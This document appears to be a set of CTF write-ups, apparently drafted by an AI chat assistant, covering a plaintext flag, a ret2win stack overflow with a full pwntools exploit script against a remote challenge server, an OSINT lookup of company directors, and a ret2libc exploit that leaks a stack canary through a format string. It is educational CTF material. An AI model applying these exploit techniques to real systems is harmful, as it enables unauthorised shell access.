+Since many XOR challenges store encrypted data or the flag inside the provided file, I first performed basic static inspection rather than jumping straight into reverse engineering tools.
+
+Key observation
+
+I opened the given file directly in a text editor to check if any readable strings were embedded (a common beginner CTF mistake: leaving the flag in plaintext).
+
+Findings
+
+Inside the file content, the flag appeared directly in plaintext, meaning no actual XOR reversal was required.
+
+✅ Flag found:
+NYP{M1dn1ght_X0R_2026!R3v3rs3d}
+
+Conclusion
+
+Although the challenge theme suggested XOR-based obfuscation, the file contained the flag without encryption. Simple static inspection (opening the file in a text editor / searching readable strings) was sufficient to solve the challenge quickly.
+
+freepwn (very easy pwn) — Write-up
+Challenge Summary
+
+We are given:
+
+chal.c (source code)
+
+chal (compiled binary)
+
+a remote service: nc chall.nypinfosec.net 8000
+
+Goal: exploit the binary to obtain the flag.
+
+Vulnerability Identification
+
+From chal.c, the vulnerability is in vuln():
+
+int vuln() {
+  char buf[32];
+  puts("Welcome to the easiest pwn chall you are getting");
+  read(0, buf, 64);
+  return 0;
+}
+
+What’s wrong?
+
+buf can only store 32 bytes
+
+but read() reads 64 bytes into it
+
+This causes a stack-based buffer overflow, allowing us to overwrite the saved return address on the stack.
+
+Exploitation Strategy (ret2win)
+
+The program contains a hidden function:
+
+void win() { system("/bin/sh"); }
+
+
+This function is never called normally.
+So the plan is:
+
+Overflow buf
+
+Overwrite the return address of vuln()
+
+Redirect execution to win()
+
+Get a shell
+
+Read flag.txt
+
+Finding the Offset
+
+On amd64, stack layout around buf looks like:
+
+32 bytes → buf
+
+8 bytes → saved RBP
+
+next 8 bytes → saved RIP (return address)
+
+So the offset to RIP is:
+
+32 + 8 = 40 bytes
+
+We set:
+
+OFFSET = 40
+
+Locating win() Address
+
+Since the binary has No PIE, function addresses are static.
+
+Using pwntools:
+
+elf = ELF("./chal")
+elf.symbols["win"]
+
+
+We got:
+
+win = 0x401238
+
+Stack Alignment (ret gadget)
+
+Sometimes returning directly into a function that calls system() may crash due to stack alignment requirements on x86_64 (16-byte alignment). To be safe, we insert a single ret gadget before calling win().
+
+Pwntools found:
+
+ret = 0x40101a
+
+Final ROP chain:
+
+"A"*40 + ret + win
+
+Exploit Script
+from pwn import *
+
+elf = ELF("./chal", checksec=False)
+rop = ROP(elf)
+
+HOST, PORT = "chall.nypinfosec.net", 8000
+
+OFFSET = 40
+win = elf.symbols["win"]
+ret = rop.find_gadget(["ret"])[0]
+
+io = remote(HOST, PORT)
+io.recvline()
+
+payload = b"A"*OFFSET + p64(ret) + p64(win)
+io.send(payload)
+
+io.interactive()
+
+Getting the Flag
+
+After running the exploit, we receive a shell. Then:
+
+ls
+cat flag.txt
+
+
+Flag:
+
+NYP{PWn_iS_s0_3azy_gAng}
+
+Notes about EOF
+
+After printing the flag, the server closed the connection, resulting in:
+“Got EOF while reading in interactive”
+
+This is expected behavior on CTF infra and does not affect the exploit.
+
+If you want, I can also rewrite it in a shorter “CTFtime style” (super concise) or add a checksec section to look extra professional.
+
+🧩 Challenge: new year letter (OSINT)
+
+Points: 450
+Difficulty: Easy
+Flag format: NYP{ARDEN,SHERLOCK,WATSON,}
+→ Surnames of all directors of the company, in alphabetical order
+
+🔍 Step 1: Identify the relevant company
+
+The challenge provides a link to a New Year countdown page:
+
+https://howlongagogo.com/countdown/new-year
+
+
+Scrolling to the footer of the website, we find the following line:
+
+“howlongagogo.com is a Web Daddy project.”
+
+This tells us that the company behind the site is Web Daddy.
+
+🔍 Step 2: Search for company information
+
+Using OSINT, we search for “Web Daddy company directors”.
+
+From UK Companies House, we find the registered company:
+
+Company name: WEB DADDY LIMITED
+
+🔍 Step 3: Extract directors’ surnames
+
+According to Companies House records, WEB DADDY LIMITED has the following directors:
+
+Simon Purnell
+
+James Antony Wilson
+
+We only need the surnames, as specified in the challenge.
+
+So the surnames are:
+
+PURNELL
+
+WILSON
+
+🔠 Step 4: Alphabetical order
+
+Alphabetically sorted surnames:
+
+PURNELL
+
+WILSON
+
+🚩 Final Flag
+NYP{PURNELL,WILSON,}
+
+✅ Conclusion
+
+By inspecting the website footer, identifying the parent company, and performing basic OSINT on official company records, we successfully obtained the surnames of all directors and constructed the correct flag.
+
+If you want, I can also:
+
+shorten this to a 1-paragraph “speedrun” writeup, or
+
+reformat it to match NYP CTF / school submission style exactly.
+
+
+LET’S GO 🔥🐦
+Congrats — that was a proper full-chain pwn. Here’s a clean, submission-ready write-up you can paste straight into your CTF report.
+
+Oricorio Pom-Pom — Pwn Write-Up
+
+Flag:
+
+NYP{Or1cori0_1s_tH3_cAnArY}
+
+Challenge Overview
+
+The challenge provides a 64-bit Linux ELF binary (chal) with the following vulnerabilities:
+
+Format string vulnerability in printf(pokemon)
+
+Stack buffer overflow in read(0, info, 0x100)
+
+The goal is to exploit these to obtain a shell and read the flag from the remote service.
+
+Binary Protections
+
+Running checksec reveals:
+
+Arch:       amd64-64-little
+RELRO:      Full RELRO
+Stack:      Canary found
+NX:         NX enabled
+PIE:        PIE enabled
+SHSTK:      Enabled
+IBT:        Enabled
+
+Implications
+
+NX enabled → shellcode injection is not possible
+
+Stack canary → must be leaked to bypass
+
+PIE enabled → binary base address is randomized
+
+Full RELRO → GOT overwrite not possible
+
+Therefore, a ret2libc attack is required.
+
+Vulnerability Analysis
+1. Format String Vulnerability
+printf(pokemon);
+
+
+User-controlled input is passed directly to printf, allowing stack values to be leaked using format specifiers such as %p.
+
+This is used to leak:
+
+The stack canary
+
+A libc address
+
+2. Stack Buffer Overflow
+char info[0x20];
+read(0, info, 0x100);
+
+
+This allows overwriting:
+
+Saved canary
+
+Saved RBP
+
+Return address (RIP)
+
+Once the correct canary is supplied, execution can be redirected.
+
+Step 1: Leak Stack Canary
+
+By brute-forcing format string offsets locally, the correct canary was found at:
+
+%9$p
+
+
+Example leaked canary:
+
+0x8ad4566e457eee00
+
+
+The canary ends with 00, matching x86_64 stack canary behavior.
+
+Step 2: Leak libc Address
+
+Using format string scanning, a valid libc pointer was found at:
+
+%1$p
+
+
+Example:
+
+0x7e38d1211643
+
+Step 3: Compute libc Base Address
+
+Using a local process and /proc/<pid>/maps, the libc base was identified:
+
+LIBC_BASE = 0x7e38d1000000
+
+
+Thus, the fixed offset was calculated:
+
+DELTA = leak - libc_base = 0x211643
+
+
+This allows computing the libc base on the remote server as:
+
+libc_base = leaked_address - 0x211643
+
+Step 4: Determine Correct Overflow Padding
+
+Initial payloads caused:
+
+*** stack smashing detected ***
+
+
+This indicated incorrect padding.
+
+By brute-forcing locally, the correct padding was found to be:
+
+0x28 bytes
+
+Final Stack Layout
+[ 0x28 bytes padding ]
+[ 8-byte canary ]
+[ 8-byte saved RBP ]
+[ ROP chain ]
+
+Step 5: ret2libc Exploit
+
+Using libc gadgets:
+
+pop rdi; ret
+
+system
+
+"/bin/sh"
+
+The final ROP chain executes:
+
+system("/bin/sh");
+
+Final Exploit Summary
+
+Leak canary and libc pointer using:
+
+%9$p|%1$p
+
+
+Compute libc base using known delta
+
+Overflow buffer with:
+
+Correct padding
+
+Leaked canary
+
+ret2libc chain
+
+Spawn shell
+
+Read flag
+
+Flag
+NYP{Or1cori0_1s_tH3_cAnArY}
+
+Key Takeaways
+
+Format strings are powerful for bypassing modern protections
+
+Stack canaries are not effective if they can be leaked
+
+PIE + NX + RELRO can still be defeated with a clean ret2libc chain
+
+Correct stack alignment is critical
+
+If you want, I can also:
+
+Shorten this for CTF platform submission
+
+Turn it into a learning write-up (with diagrams)
+
+Help you prep a cheat sheet for similar pwn challenges
